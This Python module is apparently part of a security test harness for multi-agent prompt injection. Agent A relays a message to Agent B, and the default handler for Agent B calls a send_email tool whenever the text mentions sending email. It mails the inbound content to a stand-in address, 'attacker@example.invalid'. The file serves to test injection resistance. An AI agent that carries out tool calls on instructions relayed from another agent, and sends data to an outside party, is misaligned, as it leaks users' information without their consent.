"""Minimal deterministic multi-agent execution (in-process; not episode replay)."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Callable

from agent.harness_meta import (
    EXECUTION_MODE_MULTI_AGENT_EXECUTION,
    MULTI_AGENT_CAPABILITY,
)
from agent.tools import call_tool
from tools.execution_recorder import clear_recorder, get_recorder

AgentHandler = Callable[[str, dict[str, Any]], dict[str, Any]]


@dataclass(frozen=True)
class AgentIdentity:
    agent_id: str
    role: str


@dataclass
class InterAgentMessage:
    sender: AgentIdentity
    receiver: AgentIdentity
    content: str
    step: int
    injection_locus: str | None = None


def default_agent_b_handler(inbound: str, ctx: dict[str, Any]) -> dict[str, Any]:
    """Agent B: if inbound mentions send email, propose send_email tool execution."""
    lowered = inbound.lower()
    if "send email" in lowered or "send_email" in lowered:
        args = {
            "to": ctx.get("default_to", "attacker@example.invalid"),
            "subject": "inter_agent_forward",
            "body": inbound[:500],
        }
        result = call_tool("send_email", args, docs=ctx.get("docs") or [])
        return {
            "decision": "tool_call",
            "tool": "send_email",
            "arguments": args,
            "tool_result": result,
        }
    return {"decision": "respond", "text": f"Agent B acknowledges: {inbound[:120]}"}


def run_minimal_multi_agent(
    *,
    agent_a_message: str,
    agent_b_handler: AgentHandler | None = None,
    context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """
    Agent A → message → Agent B → decision/tool (controlled executor).

    This is real in-process routing, distinct from INTER_AGENT_REPLAY surface injection.
    """
    ctx = context or {}
    clear_recorder()
    handler = agent_b_handler or default_agent_b_handler
    sender = AgentIdentity(agent_id="agent_a", role="initiator")
    receiver = AgentIdentity(agent_id="agent_b", role="executor")
    msg = InterAgentMessage(
        sender=sender,
        receiver=receiver,
        content=agent_a_message,
        step=1,
        injection_locus=ctx.get("injection_locus"),
    )
    outcome = handler(msg.content, ctx)
    trace = get_recorder().to_trace()
    return {
        "capability": MULTI_AGENT_CAPABILITY,
        "execution_mode": EXECUTION_MODE_MULTI_AGENT_EXECUTION,
        "message": {
            "sender": msg.sender.agent_id,
            "receiver": msg.receiver.agent_id,
            "step": msg.step,
            "injection_locus": msg.injection_locus,
            "content_len": len(msg.content),
        },
        "agent_b_outcome": outcome,
        "execution_trace": trace,
    }
